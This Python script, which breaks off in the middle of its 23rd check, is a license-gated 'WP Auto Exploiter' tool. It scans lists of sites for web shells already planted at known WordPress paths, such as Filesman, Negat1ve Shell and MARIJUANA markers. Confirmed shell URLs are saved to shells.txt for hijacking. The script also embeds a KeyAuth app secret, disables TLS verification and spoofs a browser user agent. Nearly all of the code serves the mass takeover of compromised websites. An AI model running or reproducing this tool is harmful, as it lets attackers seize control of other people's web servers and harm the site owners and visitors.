# -*-coding:Latin-1 -*
import sys , requests, re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
from pathlib import Path 
import os
os.system("pip install keyauth")
from keyauth import api
import sys
import time
import platform
import os
import hashlib,string
from time import sleep
from datetime import datetime
import concurrent.futures
from requests import Session
from random import getrandbits
import random


requests.urllib3.disable_warnings()
def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


if sys.version_info.minor < 10: 
    print("[Security] - Python 3.10 or higher is recommended. The bypass will not work on 3.10+")
    print("You are using Python {}.{}".format(sys.version_info.major, sys.version_info.minor))

if platform.system() == 'Windows':
    os.system('cls & title Python Example')  
elif platform.system() == 'Linux':
    os.system('clear')  
    sys.stdout.write("\x1b]0;Python Example\x07")
elif platform.system() == 'Darwin':
    os.system("clear && printf '\e[3J'")  
    os.system('''echo - n - e "\033]0;Python Example\007"''') 
print("Initializing....")
def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest
keyauthapp = api(
    name = "ravi", 
    ownerid = "kIik4ediGG", 
    secret = "7b47d1595972c84c46cfb7d0e834b98065ba5f34d6fe362cbea60b4475ff34d9", 
    version = "1.0",
    hash_to_check = getchecksum()
)
os.system('cls' if os.name == 'nt' else 'clear')
r ="""\033[1;32;40m
    ___ _    _____       ____  ____  ______
   /   | |  / /   |     / __ )/ __ \/_  __/
  / /| | | / / /| |    / __  / / / / / /
 / ___ | |/ / ___ |   / /_/ / /_/ / / /
/_/  |_|___/_/  |_|  /_____/\____/ /_/
                            \033[1;33;40m(Version:1.0)
                     \033[1;36;40mWp Auto Exploiter
\033[1;32;40m  Developed By TEAM BADS
                 TG: https://t.me/bads_community


"""
print(r)
print(f"\033[0;31mCurrent Session Validation Status: {keyauthapp.check()}")
print(f"\033[0;31mBlacklisted? : {keyauthapp.checkblacklist()}")  
def answer():
    try:
        print("""\033[0;32m
1.Login
2.Register
3.Upgrade
4.License Key Only
        """)
        ans = input("\033[1;33mSelect Option: ")
        if ans == "1":
            user = input('Provide username: ')
            password = input('\033[0;31mProvide password: ')
            keyauthapp.login(user, password)
        elif ans == "2":
            user = input('\033[0;31mProvide username: ')
            password = input('\033[0;31mProvide password: ')
            license = input('\033[0;31mProvide License: ')
            keyauthapp.register(user, password, license)
        elif ans == "3":
            user = input('\033[0;31mProvide username: ')
            license = input('\033[0;31mProvide License: ')
            keyauthapp.upgrade(user, license)
        elif ans == "4":
            key = input('\033[0;32mEnter your license: ')
            keyauthapp.license(key)
        else:
            print("\n\033[1;33mNot Valid Option")
            time.sleep(1)
            os.system('cls')
            answer()
    except KeyboardInterrupt:
        os._exit(1)
answer()
'''try:
    if os.path.isfile('auth.json'): #Checking if the auth file exist
        if jsond.load(open("auth.json"))["authusername"] == "": #Checks if the authusername is empty or not
            print("""
1. Login
2. Register
            """)
            ans=input("Select Option: ")  #Skipping auto-login bc auth file is empty
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license) 
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        else:
            try: #2. Auto login
                with open('auth.json', 'r') as f:
                    authfile = jsond.load(f)
                    authuser = authfile.get('authusername')
                    authpass = authfile.get('authpassword')
                    keyauthapp.login(authuser,authpass)
            except Exception as e: #Error stuff
                print(e)
    else: #Creating auth file bc its missing
        try:
            f = open("auth.json", "a") #Writing content
            f.write("""{
    "authusername": "",
    "authpassword": ""
}""")
            f.close()
            print ("""
1. Login
2. Register
            """)#Again skipping auto-login bc the file is empty/missing
            ans=input("Select Option: ") 
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        except Exception as e: #Error stuff
            print(e)
            os._exit(1) 
except Exception as e: #Error stuff
    print(e)
    os._exit(1)'''
print("\nUser data: ")
print("Username: " + keyauthapp.user_data.username)
print("IP address: " + keyauthapp.user_data.ip)
print("Hardware-Id: " + keyauthapp.user_data.hwid)
subs = keyauthapp.user_data.subscriptions  
for i in range(len(subs)):
    sub = subs[i]["subscription"]  
    expiry = datetime.utcfromtimestamp(int(subs[i]["expiry"])).strftime(
        '%Y-%m-%d %H:%M:%S')  
    timeleft = subs[i]["timeleft"] 

    print(f"[{i + 1} / {len(subs)}] | Subscription: {sub} - Expiry: {expiry} - Timeleft: {timeleft}")
onlineUsers = keyauthapp.fetchOnline()
OU = "" 
if onlineUsers is None:
    OU = "No online users"
else:
    for i in range(len(onlineUsers)):
        OU += onlineUsers[i]["credential"] + " "
print("\n" + OU + "\n")
print("Created at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.createdate)).strftime('%Y-%m-%d %H:%M:%S'))
print("Last login at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.lastlogin)).strftime('%Y-%m-%d %H:%M:%S'))
print("Expires at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.expires)).strftime('%Y-%m-%d %H:%M:%S'))
print(f"Current Session Validation Status: {keyauthapp.check()}")
os.system("clear")
init(autoreset=True)
fr  =   Fore.RED
fg  =   Fore.GREEN
os.system('cls' if os.name == 'nt' else 'clear')
print (r)
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
# try:
#     fileName = input('\033[1;31mSite Lists: ')
#     file = Path(__file__).with_name(fileName)
#     target = [i.strip() for i in file.open('r').readlines()]
# except IndexError:
#     path = str(sys.argv[0]).split('\\')
#     exit('\n\033[1;31m  [!] Enter <' + path[len(path) - 1] + '> <your list.txt>')
# poolAmount = int(input("\033[1;31mThreads: "))

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def exploit_1(url):
    try:
        #try with http
        url = 'http://'+URLdomain(url)
        check = requests.get(url+'/wp-content/themes/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
        if ('Negat1ve Shell' in check.content.decode("utf-8")):
                print ('[#] Exploit 1 --> ' + url + ' {}[Succefully]'.format(fg))
                open('shells.txt', 'a').write(url + '/wp-content/themes/ccx/index.php\n')
        #try with https
        else:
            url = 'https://' + URLdomain(url)
            
            check = requests.get(url+'/wp-content/themes/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Negat1ve Shell' in check.content.decode("utf-8"):
                    print ('[#] Exploit 1 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/themes/ccx/index.php\n')
            else:
                print ('[#] Exploit 1 --> ' + url + ' {}[Failed]'.format(fr))
            
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
        
        
        
        
def exploit_2(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/sid/sidwso.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 2 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/sid/sidwso.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/sid/sidwso.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 2 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/sid/sidwso.php\n')
            else:
                print ('[#] Exploit 2 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_3(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 3 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 3 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
            else:
                print ('[#] Exploit 3 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_4(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 4 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 4 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
            else:
                print ('[#] Exploit 4 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_5(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('[#] Exploit 5 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/images/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 5 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/images/mar.php\n')
            else:
                print ('[#] Exploit 5 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_6(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('[#] Exploit 6 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/m4r1ju4n4.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 6 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/m4r1ju4n4.php\n')
            else:
                print ('[#] Exploit 6 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_7(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 7 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 7 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/mari.php\n')
            else:
                print (' Exploit 7 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_8(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 8 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/marijuana.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 8 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/marijuana.php\n')
            else:
                print ('[#] Exploit 8 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_9(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 9 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/colors/maro.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 9 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/colors/maro.php\n')
            else:
                print ('[#] Exploit 9 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_10(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 10 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 10 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/mari.php\n')
            else:
                print ('[#] Exploit 10 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_11(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 11 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 11 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/mar.php\n')
            else:
                print ('[#] Exploit 11 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_12(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 12 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/maro.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 12 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/maro.php\n')
            else:
                print ('[#] Exploit 12 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_13(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 13 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/includes/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 13 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/includes/mari.php\n')
            else:
                print ('[#] Exploit 13 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_14(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 14 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/maint/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 14 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/maint/mari.php\n')
            else:
                print ('[#] Exploit 14 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_15(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 15 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 15 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/mari.php\n')
            else:
                print ('[#] Exploit 15 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_16(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 16 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 16 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/mari.php\n')
            else:
                print ('[#] Exploit 16 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_17(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 17 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 17 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mari.php\n')
            else:
                print ('[#] Exploit 17 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_18(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 18 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 18 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mar.php\n')
            else:
                print ('[#] Exploit 18 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_19(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 19 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/maro.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 19 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/maro.php\n')
            else:
                print ('[#] Exploit 19 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_20(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 20 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 20 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/mari.php\n')
            else:
                print ('[#] Exploit 20 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_21(url):
    try:
        # try with http
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 21 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/hello.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 21 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/hello.php\n')
            else:
                print ('[#] Exploit 21 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_22(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/ccx/index.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Negat1ve Shell' in check.content.decode("utf-8")):
                print (' [#] Exploit 22 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/ccx/index.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Negat1ve Shell' in check.content.decode("utf-8"):
                    print (' [#] Exploit 22 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/ccx/index.php\n')
            else:
                print ('[#] Exploit 22 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_23(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/ccx/index.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Negat1ve Shell' in check.content.decode("utf-8")):
                print (' [#] Exploit 23 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/ccx/index.php\n')
